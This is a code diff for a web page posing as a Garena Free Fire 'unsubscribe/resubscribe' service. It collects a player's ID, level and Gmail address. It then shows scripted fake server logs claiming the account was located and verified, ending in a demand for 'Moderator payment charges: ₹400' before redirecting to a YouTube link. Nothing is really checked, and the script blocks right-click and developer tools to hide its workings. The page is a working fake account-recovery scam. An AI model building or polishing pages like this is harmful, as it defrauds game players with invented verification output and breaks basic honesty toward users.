@@ -12,11 +12,11 @@
             box-sizing: border-box;
             font-family: '-apple-system', BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             -webkit-tap-highlight-color: transparent;
+            user-select: none;
         }
 
         body {
             background-color: #0f0f13;
-            /* Gamer theme abstract background for glass effect to shine */
             background-image: radial-gradient(circle at 15% 50%, rgba(0, 255, 128, 0.15), transparent 25%),
                               radial-gradient(circle at 85% 30%, rgba(255, 0, 128, 0.15), transparent 25%);
             background-size: cover;
@@ -31,57 +31,11 @@
             overflow-x: hidden;
         }
 
-        /* Initial Splash Screen */
-        .splash-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            transition: opacity 0.8s ease-out, visibility 0.8s;
-        }
-
-        .splash-screen.hide {
-            opacity: 0;
-            visibility: hidden;
-        }
-
-        .splash-text {
-            font-size: 3rem;
-            font-weight: 800;
-            background: linear-gradient(90deg, #00ff88, #00ccff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            animation: glowPulse 2s infinite alternate;
-            text-align: center;
-        }
-
-        .splash-sub {
-            color: #888;
-            margin-top: 10px;
-            font-size: 1.2rem;
-            letter-spacing: 5px;
-            text-transform: uppercase;
-            animation: fadeUp 1s ease-out forwards;
-            opacity: 0;
-            transform: translateY(20px);
-        }
-
         /* Container & Glassmorphism (Apple Liquid Glass Theme) */
         .container {
             width: 100%;
             max-width: 500px;
             perspective: 1000px;
-            display: none; /* Hidden until splash finishes */
-            animation: popIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
         }
 
         .glass-panel {
@@ -94,30 +48,31 @@
             box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5), inset 0 0 0 1px rgba(255, 255, 255, 0.05);
             position: relative;
             overflow: hidden;
+            transition: transform 0.3s ease;
         }
 
-        /* Glass Shine Effect */
-        .glass-panel::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 50%;
-            height: 100%;
-            background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.05) 50%, rgba(255,255,255,0) 100%);
-            transform: skewX(-20deg);
-            animation: shine 6s infinite;
+        /* Shake Animation for Validation Error */
+        @keyframes shakeError {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+            20%, 40%, 60%, 80% { transform: translateX(10px); }
+        }
+
+        .shake {
+            animation: shakeError 0.5s cubic-bezier(.36,.07,.19,.97) both;
+            border: 1px solid rgba(255, 51, 102, 0.5);
+            box-shadow: 0 0 20px rgba(255, 51, 102, 0.3);
         }
 
         /* Header */
         header {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
 
         h1 {
             font-size: 2.2rem;
-            color: #00ff44;
+            color: #00ff44; /* Highlighted Green */
             text-transform: uppercase;
             font-weight: 800;
             text-shadow: 0 0 15px rgba(0, 255, 68, 0.6), 0 0 30px rgba(0, 255, 68, 0.3);
@@ -127,6 +82,7 @@
         /* Form Elements */
         .form-group {
             margin-bottom: 20px;
+            position: relative;
         }
 
         label {
@@ -148,10 +104,9 @@
             font-size: 1rem;
             transition: all 0.3s ease;
             outline: none;
-            appearance: none; /* Clean look for select */
+            appearance: none;
         }
 
-        /* Custom dropdown arrow for select */
         select {
             background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23FFFFFF%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E");
             background-repeat: no-repeat;
@@ -168,6 +123,20 @@
             border-color: #00ff44;
             box-shadow: 0 0 15px rgba(0, 255, 68, 0.2);
             background: rgba(0, 0, 0, 0.5);
+        }
+
+        input.input-error, select.input-error {
+            border-color: #ff3366;
+            box-shadow: 0 0 10px rgba(255, 51, 102, 0.3);
+        }
+
+        .error-msg {
+            color: #ff3366;
+            font-size: 0.85rem;
+            margin-top: 5px;
+            padding-left: 5px;
+            font-weight: bold;
+            display: none;
         }
 
         /* Button */
@@ -202,55 +171,48 @@
             display: none;
         }
 
-        .loader-ring {
-            width: 80px;
-            height: 80px;
-            border: 4px solid rgba(0, 255, 68, 0.1);
-            border-top: 4px solid #00ff44;
-            border-radius: 50%;
-            margin: 0 auto 20px;
-            animation: spin 1s linear infinite;
-            box-shadow: 0 0 20px rgba(0, 255, 68, 0.4);
-        }
-
         .process-title {
             text-align: center;
-            color: #fff;
+            color: #00ff44;
             margin-bottom: 20px;
-            font-size: 1.2rem;
+            font-size: 1.6rem;
+            font-weight: bold;
+            text-transform: uppercase;
             letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(0, 255, 68, 0.5);
+            animation: pulse 2s infinite alternate;
         }
 
         .process-log {
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.6);
             border-radius: 12px;
             padding: 20px;
-            height: 220px;
+            height: 250px;
             overflow-y: auto;
             border: 1px solid rgba(255, 255, 255, 0.05);
             font-family: 'Courier New', Courier, monospace;
-            font-size: 0.9rem;
-            box-shadow: inset 0 0 15px rgba(0,0,0,0.8);
+            font-size: 0.95rem;
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.8);
         }
 
         .log-entry {
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             opacity: 0;
-            transform: translateX(-10px);
+            transform: translateY(10px);
             transition: all 0.3s ease;
         }
 
         .log-entry.visible {
             opacity: 1;
-            transform: translateX(0);
+            transform: translateY(0);
         }
 
-        .c-green { color: #00ff44; }
-        .c-blue { color: #00ccff; }
-        .c-red { color: #ff3366; }
-        .c-yellow { color: #ffcc00; }
+        .c-green { color: #00ff44; font-weight: bold; }
+        .c-blue { color: #00ccff; font-weight: bold; }
+        .c-red { color: #ff3366; font-weight: bold; }
+        .c-yellow { color: #ffcc00; font-weight: bold; }
 
-        /* Transition Blinking Screen (Aapki Image) */
+        /* Transition Blinking Screen */
         .transition-screen {
             position: fixed;
             top: 0;
@@ -265,7 +227,6 @@
             opacity: 0;
             pointer-events: none;
             transition: opacity 0.5s ease;
-            backdrop-filter: blur(10px);
         }
 
         .transition-screen.active {
@@ -274,134 +235,106 @@
         }
 
         .transition-image {
-            max-width: 150px;
-            filter: drop-shadow(0 0 20px rgba(0, 255, 68, 0.5));
-        }
-
-        /* Animations */
-        @keyframes glowPulse {
-            from { text-shadow: 0 0 10px rgba(0, 255, 136, 0.5); }
-            to { text-shadow: 0 0 30px rgba(0, 255, 136, 1), 0 0 40px rgba(0, 204, 255, 0.8); }
-        }
-
-        @keyframes fadeUp {
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        @keyframes popIn {
-            0% { opacity: 0; transform: scale(0.9) translateY(20px); }
-            100% { opacity: 1; transform: scale(1) translateY(0); }
-        }
-
-        @keyframes shine {
-            0% { left: -100%; }
-            20% { left: 200%; }
-            100% { left: 200%; }
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            max-width: 15%;
+            max-height: 15%;
         }
 
         @keyframes blinkImage {
-            0%, 100% { opacity: 1; transform: scale(1); filter: drop-shadow(0 0 20px rgba(0, 255, 68, 0.8)); }
-            50% { opacity: 0.3; transform: scale(0.85); filter: drop-shadow(0 0 5px rgba(0, 255, 68, 0.2)); }
+            0% { opacity: 1; transform: scale(1); filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.8)); }
+            50% { opacity: 0.5; transform: scale(0.95); filter: drop-shadow(0 0 0px rgba(255, 255, 255, 0)); }
+            100% { opacity: 1; transform: scale(1); filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.8)); }
         }
 
-        .blink-anim {
-            animation: blinkImage 0.8s infinite ease-in-out;
+        .transition-image.blink {
+            animation: blinkImage 1s infinite ease-in-out;
         }
 
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); border-radius: 10px; }
-        ::-webkit-scrollbar-thumb { background: rgba(0, 255, 68, 0.3); border-radius: 10px; }
-        ::-webkit-scrollbar-thumb:hover { background: rgba(0, 255, 68, 0.6); }
+        @keyframes pulse {
+            from { text-shadow: 0 0 5px rgba(0, 255, 68, 0.5); }
+            to { text-shadow: 0 0 20px rgba(0, 255, 68, 0.8); }
+        }
 
-        @media (max-width: 480px) {
-            h1 { font-size: 1.8rem; }
-            .glass-panel { padding: 25px 20px; border-radius: 20px; }
-            .splash-text { font-size: 2.2rem; }
+        @media (max-width: 768px) {
+            .transition-image { max-width: 25%; max-height: 25%; }
         }
     </style>
 </head>
 <body>
 
-    <div class="splash-screen" id="splashScreen">
-        <div class="splash-text">Garena Free Fire</div>
-        <div class="splash-sub">System Initialization</div>
-    </div>
-
     <div class="transition-screen" id="transitionScreen">
-        <img src="https://pending404.github.io/image/ff-loding.png" alt="Loading" class="transition-image blink-anim">
+        <img src="https://pending404.github.io/image/ff-loding.png" alt="Loading" class="transition-image" id="transitionImage">
     </div>
 
     <div class="container" id="mainContainer">
-        <div class="glass-panel">
+        <div class="glass-panel" id="glassPanel">
             
             <div id="formSection">
                 <header>
                     <h1>Free Fire Unsubscribe</h1>
                 </header>
                 
-                <form id="unsubscribeForm">
+                <form id="unsubscribeForm" novalidate>
+                    
                     <div class="form-group">
-                        <label for="uid">Free Fire Player ID (UID)</label>
-                        <input type="number" id="uid" placeholder="Enter your 8-12 digit UID" required>
+                        <label>Free Fire Player ID</label>
+                        <input type="text" id="uid" inputmode="numeric" placeholder="Please enter your ID" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                        <div class="error-msg" id="uidError">Please enter a valid Player ID (7 to 16 digits).</div>
                     </div>
 
                     <div class="form-group">
-                        <label for="device">Your Device</label>
-                        <select id="device" required>
-                            <option value="" disabled selected>Select device type</option>
+                        <label>Your Device</label>
+                        <select id="device">
+                            <option value="" disabled selected>Choose your device</option>
                             <option value="Android">Android</option>
                             <option value="iPhone">iOS (iPhone)</option>
                             <option value="PC">PC (Emulator)</option>
                         </select>
+                        <div class="error-msg" id="deviceError">Please select your device.</div>
                     </div>
 
                     <div class="form-group">
-                        <label for="server">Server Region</label>
-                        <select id="server" required>
-                            <option value="" disabled selected>Select server region</option>
+                        <label>Server Region</label>
+                        <select id="server">
+                            <option value="" disabled selected>Select your server</option>
                             <option value="India">India</option>
                             <option value="Bangladesh">Bangladesh</option>
-                            <option value="Nepal">Nepal</option>
                             <option value="Singapore">Singapore</option>
                             <option value="MENA">MENA</option>
                             <option value="Brazil">Brazil</option>
                         </select>
+                        <div class="error-msg" id="serverError">Please select a server region.</div>
                     </div>
 
                     <div class="form-group">
-                        <label for="reason">Reason for Unsubscribe</label>
-                        <select id="reason" required>
+                        <label>Reason for Unsubscribe</label>
+                        <select id="reason">
                             <option value="" disabled selected>Select a reason...</option>
                             <option value="Maine janbuj ke khud Kiya">Maine janbuj ke khud Kiya</option>
                             <option value="Kisi aur Ne Kar Diya">Kisi aur Ne Kar Diya</option>
                             <option value="Gmail compromise ho gaya tha">Gmail compromise ho gaya tha</option>
                             <option value="Mere ko pata nahin">Mere ko pata nahin</option>
                         </select>
+                        <div class="error-msg" id="reasonError">Please select a reason.</div>
                     </div>
 
                     <div class="form-group">
-                        <label for="level">ID Level</label>
-                        <input type="number" id="level" placeholder="E.g. 65" min="1" max="100" required>
+                        <label>ID Level</label>
+                        <input type="text" id="level" inputmode="numeric" placeholder="Enter ID Level" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                        <div class="error-msg" id="levelError">ID mismatch or Level not found (Must be between 11 to 95).</div>
                     </div>
 
                     <div class="form-group">
-                        <label for="gmail">Gmail ID Jo Unsubscribe Ho Gaya</label>
-                        <input type="email" id="gmail" placeholder="Enter affected Gmail address" required>
+                        <label>Unsubscribed Gmail ID (To Resubscribe)</label>
+                        <input type="email" id="gmail" placeholder="Enter Gmail address">
+                        <div class="error-msg" id="gmailError">Please enter a valid Gmail ID.</div>
                     </div>
 
-                    <button type="submit" class="btn-submit">PROCEED</button>
+                    <button type="button" class="btn-submit" id="proceedBtn">PROCEED</button>
                 </form>
             </div>
 
             <div class="processing-container" id="processingSection">
-                <div class="loader-ring"></div>
-                <div class="process-title">Garena Server Sync</div>
+                <div class="process-title">FREE FIRE RESUBSCRIBE</div>
                 <div class="process-log" id="processLog">
                     </div>
             </div>
@@ -412,107 +345,180 @@
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             
-            // Elements
-            const splashScreen = document.getElementById('splashScreen');
-            const mainContainer = document.getElementById('mainContainer');
-            const formSection = document.getElementById('formSection');
-            const processingSection = document.getElementById('processingSection');
-            const unsubscribeForm = document.getElementById('unsubscribeForm');
-            const processLog = document.getElementById('processLog');
-            const transitionScreen = document.getElementById('transitionScreen');
-
-            // 1. Handle Splash Screen
-            setTimeout(() => {
-                splashScreen.classList.add('hide');
-                setTimeout(() => {
-                    splashScreen.style.display = 'none';
-                    mainContainer.style.display = 'block';
-                }, 800);
-            }, 2500); // Splash screen visible for 2.5 seconds
-
-            // 2. Handle Form Submit
-            unsubscribeForm.addEventListener('submit', (e) => {
-                e.preventDefault(); // Prevent page reload
-
-                // Hide Form, Show Processing
-                formSection.style.display = 'none';
-                processingSection.style.display = 'block';
-
-                // Get User Inputs for realism in logs
-                const uid = document.getElementById('uid').value;
-                const device = document.getElementById('device').value;
-                const server = document.getElementById('server').value;
-                const gmail = document.getElementById('gmail').value;
-
-                // Start Fake Terminal Logging
-                startServerSyncLogs(uid, device, server, gmail);
-            });
-
-            // 3. Fake Server Log Generator
-            function startServerSyncLogs(uid, device, server, gmail) {
-                const logs = [
-                    `<span class="c-blue">[*] Initiating secure connection to Garena ${server} Server...</span>`,
-                    `<span class="c-green">[+] Connection Established successfully.</span>`,
-                    `<span class="c-yellow">[*] Verifying Device Fingerprint: ${device}...</span>`,
-                    `<span class="c-green">[+] Device Authenticated.</span>`,
-                    `<span class="c-blue">[*] Fetching player data for UID: ${uid}...</span>`,
-                    `[!] Encrypted packets received. Decrypting...`,
-                    `<span class="c-green">[+] Player Profile found on Database.</span>`,
-                    `<span class="c-yellow">[*] Analyzing unbinding request for Gmail: ${gmail}...</span>`,
-                    `[!] Checking server flags and suspension logs...`,
-                    `<span class="c-green">[+] Verification parameters matched perfectly.</span>`,
-                    `<span class="c-blue">[*] Preparing secure payload for redirection...</span>`,
-                    `<span class="c-red">[!] Finalizing session...</span>`,
-                    `<span class="c-green">[+] SUCCESS: Process Ready. Redirecting to gateway...</span>`
-                ];
-
-                let currentIndex = 0;
-
-                function addLog() {
-                    if (currentIndex < logs.length) {
-                        const div = document.createElement('div');
-                        div.className = 'log-entry';
-                        div.innerHTML = logs[currentIndex];
-                        processLog.appendChild(div);
-                        
-                        // Auto scroll to bottom
-                        processLog.scrollTop = processLog.scrollHeight;
-
-                        // Trigger animation
-                        setTimeout(() => div.classList.add('visible'), 50);
-
-                        currentIndex++;
-                        
-                        // Random delay for realism (between 400ms to 1200ms)
-                        let delay = Math.floor(Math.random() * 800) + 400;
-                        setTimeout(addLog, delay);
-                    } else {
-                        // Logs finished -> Trigger Blinking Screen
-                        setTimeout(showBlinkingAndRedirect, 1000);
-                    }
-                }
-
-                // Start showing logs
-                setTimeout(addLog, 500);
-            }
-
-            // 4. Show Blinking Screen & Redirect
-            function showBlinkingAndRedirect() {
-                // Show the black screen with blinking logo
-                transitionScreen.classList.add('active');
-
-                // Wait 4 seconds showing the blinking logo, then redirect
-                setTimeout(() => {
-                    window.location.href = "https://youtu.be/DK_UsATwoxI?si=lLLHC_Sr5TxTiY2x";
-                }, 4000);
-            }
-
-            // Disable Right Click & Inspect for security feel (Optional)
+            // Prevent inspect element
             document.addEventListener('contextmenu', event => event.preventDefault());
             document.onkeydown = function(e) {
                 if(e.keyCode == 123) return false;
                 if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
                 if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+            }
+
+            const proceedBtn = document.getElementById('proceedBtn');
+            const glassPanel = document.getElementById('glassPanel');
+            const formSection = document.getElementById('formSection');
+            const processingSection = document.getElementById('processingSection');
+            const processLog = document.getElementById('processLog');
+            const transitionScreen = document.getElementById('transitionScreen');
+            const transitionImage = document.getElementById('transitionImage');
+
+            // Form validation logic on button click
+            proceedBtn.addEventListener('click', () => {
+                let isValid = true;
+
+                // Elements
+                const uid = document.getElementById('uid');
+                const device = document.getElementById('device');
+                const server = document.getElementById('server');
+                const reason = document.getElementById('reason');
+                const level = document.getElementById('level');
+                const gmail = document.getElementById('gmail');
+
+                // Error Msg Elements
+                const uidError = document.getElementById('uidError');
+                const deviceError = document.getElementById('deviceError');
+                const serverError = document.getElementById('serverError');
+                const reasonError = document.getElementById('reasonError');
+                const levelError = document.getElementById('levelError');
+                const gmailError = document.getElementById('gmailError');
+
+                // Reset all errors visually first
+                document.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
+                document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');
+
+                // 1. UID Validation (7 to 16 digits)
+                if (uid.value.length < 7 || uid.value.length > 16) {
+                    uid.classList.add('input-error');
+                    uidError.style.display = 'block';
+                    isValid = false;
+                }
+
+                // 2. Device Validation
+                if (device.value === "") {
+                    device.classList.add('input-error');
+                    deviceError.style.display = 'block';
+                    isValid = false;
+                }
+
+                // 3. Server Validation
+                if (server.value === "") {
+                    server.classList.add('input-error');
+                    serverError.style.display = 'block';
+                    isValid = false;
+                }
+
+                // 4. Reason Validation
+                if (reason.value === "") {
+                    reason.classList.add('input-error');
+                    reasonError.style.display = 'block';
+                    isValid = false;
+                }
+
+                // 5. Level Validation (11 to 95)
+                const lvlNum = parseInt(level.value);
+                if (isNaN(lvlNum) || lvlNum < 11 || lvlNum > 95) {
+                    level.classList.add('input-error');
+                    levelError.style.display = 'block';
+                    isValid = false;
+                }
+
+                // 6. Gmail Validation
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(gmail.value) || !gmail.value.toLowerCase().includes('gmail.com')) {
+                    gmail.classList.add('input-error');
+                    gmailError.style.display = 'block';
+                    isValid = false;
+                }
+
+                // If any validation fails, shake the form
+                if (!isValid) {
+                    glassPanel.classList.remove('shake');
+                    void glassPanel.offsetWidth; // Trigger reflow to restart animation
+                    glassPanel.classList.add('shake');
+                    
+                    // Remove shake class after animation completes so it can trigger again
+                    setTimeout(() => {
+                        glassPanel.classList.remove('shake');
+                    }, 500);
+                    return; // Stop execution here
+                }
+
+                // If valid, start processing
+                startProcessing(uid.value, level.value, gmail.value);
+            });
+
+            // Mask Gmail (e.g., a*******g@gmail.com)
+            function maskEmail(email) {
+                let parts = email.split('@');
+                let name = parts[0];
+                let domain = parts[1];
+                if(name.length > 2) {
+                    return name[0] + '*******' + name[name.length - 1] + '@' + domain;
+                } else {
+                    return name[0] + '***@' + domain;
+                }
+            }
+
+            function startProcessing(uid, level, email) {
+                // Hide form, show processing screen
+                formSection.style.display = 'none';
+                processingSection.style.display = 'block';
+
+                const maskedEmail = maskEmail(email);
+
+                // Logs
+                const logs = [
+                    `<span class="c-blue">[*] Initiating connection to Server Database...</span>`,
+                    `<span class="c-green">[+] Secure Connection Established.</span>`,
+                    `<span class="c-yellow">[*] Scanning Player UID: ${uid}...</span>`,
+                    `<span class="c-green">[+] Player Profile successfully located.</span>`,
+                    `[*] Checking Account Level details: Level ${level}`,
+                    `<span class="c-green">[+] Level verified successfully.</span>`,
+                    `<span class="c-blue">[*] Fetching Unsubscribed Email data...</span>`,
+                    `<span class="c-yellow">[*] Verifying Link for: ${maskedEmail}</span>`,
+                    `<span class="c-green">[+] Account parameters perfectly matched!</span>`,
+                    `[*] Preparing ID to Resubscribe...`,
+                    `<span class="c-green">[+] All checks passed. Account is ready!</span>`,
+                    `<br><span class="c-yellow">Moderator payment charges: ₹400</span>`
+                ];
+
+                let index = 0;
+
+                function appendLog() {
+                    if (index < logs.length) {
+                        const div = document.createElement('div');
+                        div.className = 'log-entry';
+                        div.innerHTML = logs[index];
+                        processLog.appendChild(div);
+                        
+                        // Scroll to bottom
+                        processLog.scrollTop = processLog.scrollHeight;
+                        
+                        // Fade in animation
+                        setTimeout(() => div.classList.add('visible'), 50);
+
+                        index++;
+                        // Random delay between lines for realism (600ms to 1500ms)
+                        let delay = Math.floor(Math.random() * 900) + 600;
+                        setTimeout(appendLog, delay);
+                    } else {
+                        // After logs finish, wait 2 seconds, then show the blinking image screen
+                        setTimeout(showBlinkingScreen, 2000);
+                    }
+                }
+
+                // Start appending logs
+                setTimeout(appendLog, 800);
+            }
+
+            function showBlinkingScreen() {
+                // Show final blinking screen
+                transitionScreen.classList.add('active');
+                transitionImage.classList.add('blink');
+
+                // Redirect without showing any text
+                setTimeout(() => {
+                    window.location.href = "https://youtu.be/DK_UsATwoxI?si=lLLHC_Sr5TxTiY2x";
+                }, 3500); // 3.5 seconds blinking before redirect
             }
         });
     </script>
